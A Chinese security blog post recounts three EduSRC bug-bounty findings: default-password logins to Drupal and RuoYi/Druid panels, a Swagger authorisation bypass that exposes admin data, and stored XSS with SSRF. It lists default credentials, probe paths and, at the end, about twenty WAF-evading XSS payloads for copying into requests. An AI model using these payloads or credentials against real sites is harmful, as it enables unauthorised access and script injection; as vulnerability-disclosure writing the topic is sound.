---
title: 记几个edusrc简单挖掘案例
url: https://mp.weixin.qq.com/s/fPvxdFmfk15CUkbzisWDHg
source: Doonsec's feed
date: 2026-01-17
fetch_date: 2026-01-18T03:34:48.557764
---

# 记几个edusrc简单挖掘案例

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/f7yXib8mBCO7BPBzDAaddljS0Jc39b1XC0cuY8KB87c6bM7icib81gYmJN4FzHRLPC8MgEcmleW5JxDrtjwTlQJpg/0?wx_fmt=jpeg)

# 记几个edusrc简单挖掘案例

原创

陌笙
陌笙

陌笙不太懂安全

![]()

在小说阅读器中沉浸阅读

免责声明

```
由于传播、利用本公众号所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，公众号陌笙不太懂安全及作者不为此承担任何责任，一旦造成后果请自行承担！如有侵权烦请告知，我们会立即删除并致歉，谢谢！
```

案例1-弱口令

```
资产收集之后，点开这个页面看到右上角这个蓝色的图标是渗透靶场经常出现的drupal,可能有nday
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/f7yXib8mBCO7BPBzDAaddljS0Jc39b1XCxbxPaBxD7eBrMAibLKuPGWcTFerjcJ1QVRReiaCLXKvzjfqFBKcO1heQ/640?wx_fmt=png&from=appmsg)

```
可以在插件里面找一下这个图标的路径，放大查看
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/f7yXib8mBCO7BPBzDAaddljS0Jc39b1XCFAHMTPoia4ra0zFWus4PZOeiaSFnIqsWKp5icwF6RIVeWPibstw551ZTicg/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/f7yXib8mBCO7BPBzDAaddljS0Jc39b1XC18xzKspGev7S4voK42UY4gKkgKRxKKvsHqg4axbK8S19uviacptw7rA/640?wx_fmt=png&from=appmsg)

```
去网上找了找了nday打了一下发现没出货之前打靶场的时候都是登录框有问题于是找了一下登录路径
```

```
/user/login #fuzz出来的,接口里面找不到
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/f7yXib8mBCO7BPBzDAaddljS0Jc39b1XCrZIv5CFgk85FM6zbvlIRZQpbkx7JI96QGedZFP9JsCW0rpbibDTxmWg/640?wx_fmt=png&from=appmsg)

```
我直接一个admin/123456
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/f7yXib8mBCO7BPBzDAaddljS0Jc39b1XC7GlY4iaZuWkodmosg1wSOS7UcuXb0u6YrJTDAJLRSZgd2JEqiaia9O7NA/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/f7yXib8mBCO7BPBzDAaddljS0Jc39b1XCfTO1yJRYafLeFlx3ibb87cdKP4icmSwmseTAyEc68RBdm1ibQsFk1xdiaA/640?wx_fmt=png&from=appmsg)

```
后面带着cookie打了打nday，依旧没东西，这个弱口令没被发现，感觉就是因为正确情况，连登录框都找不到。。依旧掌握狗运。
```

案例2-若依相关漏洞

```
资产收集之后，看指纹，里面有若依，访问查看。
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/f7yXib8mBCO7BPBzDAaddljS0Jc39b1XCoTYcbeQibVlnshmcKEruTkDy4PvNN6rGFwYrS2xYOvZltREfQl2MgeA/640?wx_fmt=png&from=appmsg)

```
直接给出了用户名和密码，点击登录，成功进入后台这种情况我都碰到好几次了，不过都是重复。。
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/f7yXib8mBCO7BPBzDAaddljS0Jc39b1XCoIDUf1PJVib0QVofyOGfBWm4o9Cz4CrPXdbZjfxjEZLA9u7gO91caaQ/640?wx_fmt=png&from=appmsg)

```
进了后台，打了半天nday，依旧空军。。。后面想了一下，经常和若依出现的还有他的好兄弟druid和swagger，进行拼接尝试。。。
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/f7yXib8mBCO7BPBzDAaddljS0Jc39b1XCp8pfhuMU8SkXFUQQvgJETav5y1SJhwwFsAO4I5NooUjmsXXBn7OjBA/640?wx_fmt=png&from=appmsg)

```
常见路径/druid/login.html/prod-api/druid/login.html/dev-api/druid/login.html我一般只手工拼接这三个，也可以使用工具直接扫描工具使用曾哥的这个就挺好用。。
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/f7yXib8mBCO7BPBzDAaddljS0Jc39b1XCMOFzksvQHeiazF3iakMcCRtTF52LCJPIyyyrLh1KZcIic3oppVZkIiaYqA/640?wx_fmt=png&from=appmsg)

```
druid常见弱口令admin/123456ruoyi/123456druid/druid
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/f7yXib8mBCO7BPBzDAaddljS0Jc39b1XCPbia6u2e3xtU6cQsdgAKFkeZskyoBy0MLKRQKs8IwlLA9vvKkUOo8TQ/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/f7yXib8mBCO7BPBzDAaddljS0Jc39b1XCvUCCibQuEubHIGjFQjBbJ87rFAql60mcrPiaIFeRxab89xzv5xPVELGA/640?wx_fmt=png&from=appmsg)

```
又经过拼接发现swagger页面但是只有文档页面/prod-api/v2/api-docs/v2/api-docs/v1/api-docs/prod-api/v1/api-docs/dev-api/v2/api-docs
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/f7yXib8mBCO7BPBzDAaddljS0Jc39b1XCZzcpMS83GUzdwbwGoMvhq5KicjCibj0849ibgWS3noyer5E6mibojzdGqQ/640?wx_fmt=png&from=appmsg)

```
这种不方便我们查看直接使用插件打开
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/f7yXib8mBCO7BPBzDAaddljS0Jc39b1XCdXbuRXUeqGVHCH3CD6ibJI2I2uTpb3ricwglVWlLpqUkDf0K3C7I8Rvw/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/f7yXib8mBCO7BPBzDAaddljS0Jc39b1XCupUK7pxHaThdy1QVaI1ibxvQj72FtNLHofUtgUb4jDCzAWkzw7UpzBg/640?wx_fmt=png&from=appmsg)

```
直接尝试了一下都是401未授权但是我们之前已经有了管理员账户用它创建一个低权限的用户，直接使用管理员cookie的话，不合适，因为本来就有这些功能，创建一个什么权限都没有的用户，更能证明危害。
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/f7yXib8mBCO7BPBzDAaddljS0Jc39b1XC7cY9TpkEJDjgFia5bDtSibibVx03uaGLJhTVxO9zI9ATpod0czlw8LbHg/640?wx_fmt=png&from=appmsg)

```
创建好之后，使用低权限用户进行登录，然后复制Authorization后面的值，来到插件进行鉴权
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/f7yXib8mBCO7BPBzDAaddljS0Jc39b1XCYcGIIkWWqm6YHDeXkjPwO7oGZkBYVHDIggAF92MAkiaPOfJ569tSIUA/640?wx_fmt=png&from=appmsg)

```
成功后查看第一个接口，发现管理员的密码，和手机号等信息也算一个小越权。。后面接口也是同理，不在一一演示。
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/f7yXib8mBCO7BPBzDAaddljS0Jc39b1XCxaQsIoYNo4Psj4pU8mNDL4rIGs1AfexFB5htTia7t58xyciaEKtL3DicA/640?wx_fmt=png&from=appmsg)

案例3-存储xss/ssrf

```
小程序这个上传存储xss很多
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/f7yXib8mBCO7BPBzDAaddljS0Jc39b1XC71XLoUZAFgoGaibfsicZvVgC5vsLH5pqX5IR5icpSGs8HPhVEhWHEkzeA/640?wx_fmt=png&from=appmsg)

```
直接点击头像进行上传，直接上传html不让传上传图片之后再进行修改html后缀能上传但是上传之后不能弹窗，被防火墙拦截了。使用poc'>"><iframe src=&#x6a;ava&#115;crip&#116;&#x3a;top[`ale`+`rt`](1)>
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/f7yXib8mBCO7BPBzDAaddljS0Jc39b1XCBkc8jdMVZKYdBIicwCDPsaKuqgkRCexX7iaLrtcf1drdRYgLXiatb8TcQ/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/f7yXib8mBCO7BPBzDAaddljS0Jc39b1XCwhaicsswzwnkLWiaL08amNVqBIyhUz5apWicHY18R2DBViaYKuO61ufLWA/640?wx_fmt=png&from=appmsg)

```
后面看了看历史包，发现有数据包里面有url尝试ssrf漏洞不能探测内网，但是能访问dnslog服务器，edusrc可以水1rank。。。
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/f7yXib8mBCO7BPBzDAaddljS0Jc39b1XCNQSzF3ssoT1sRE88OhRjKW8kmL1VFyVn8jBTf9D430LJuylicibqIlJQ/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/f7yXib8mBCO7BPBzDAaddljS0Jc39b1XCHMmR7icic7fTyicGqia9kHnVA4n3ib5w7RhW9YJWBYnYO0pyfz0IW1iaT7nA/640?wx_fmt=png&from=appmsg)

如果下次遇到上传存储xss之后不能弹窗，可以直接使用，这几个语句

复制到数据包里面发送就行，70%应该有一个会成功。

```
<svg/onload=setTimeout('\x61\x6C\x65\x72\x74\x28\x31\x29')>
<input/%00/autofocus=""/%00/onfocus=.1|alert`XSS`>
<svg/onload=window.location='javas'+'cript:ale'+'rt(1)'>
javascript:window['al'+'ert']('xss')(image_url)

'>"><iframe src=&#x6a;ava&#115;crip&#116;&#x3a;top[`ale`+`rt`](1)>

<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgieHNzIik8L3NjcmlwdD4="></iframe>
<iframe src/="data:text/html;base64,PHNjcmlwdD5hbGVydCgieHNzIik8L3NjcmlwdD4="></iframe>
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4="></object>
<img src=x onerror="\u0061\u006c\u0065\u0072\u0074(1)">
<dETAILS open onToGgle=a=confirm,a(1) x>()
<img src=x onerror=eval("alet(1)")>
<iframe src=javascript:prompt(1)>

'>"><img/src/onclick=_=alert;_(123)>
<textarea></textarea><script>alert("1")</script></textarea>
</textarea><a onbeforecopy="prompt(1)" contenteditable>test222</a></textarea>
<iframe src="data:text/html;base64,PG9iamVjdCBkYXRhPWRhdGE6dGV4dC9odG1sO2Jhc2U2NCxQSE5qY21sd2RENWhiR1Z5ZENnbmVITnpKeWs4TDNOamNtbHdkRDQ9Pjwvb2JqZWN0Pg=="></iframe>
<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED><object data='data:text/html;base64,PFNDUklQVD5hbGVydCgneHNzJyk7PC9TQ1JJUFQ+' /src><details open ontoggle=[43804..toString(36)].some(confirm)>
<svg/onload=setTimeout('\u0061\u006C\u0065\u0072\u0074\u0028\u0031\u0029')>
<img src=http://www.baidu.com x=” ⋌ ” </:>1><</:>button formaction\=alert(1)<">M<<br>
<form><button formaction=javascript:alert(1)>CLICKME
```

后台回复"加群"加入交流群

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/sz_mmbiz_png/f7yXib8mBCO4n1wSEsRXe9I7EjtXDn7f7PcEQBD0X8ly0heoXcFtjhDqXg5kHxicuwfL8iaT0nVFGEaibvK3Gib0Ovw/0?wx_fmt=png)

陌笙不太懂安全

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/sz_mmbiz_png/f7yXib8mBCO4n1wSEsRXe9I7EjtXDn7f7PcEQBD0X8ly0heoXcFtjhDqXg5kHxicuwfL8iaT0nVFGEaibvK3Gib0Ovw/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过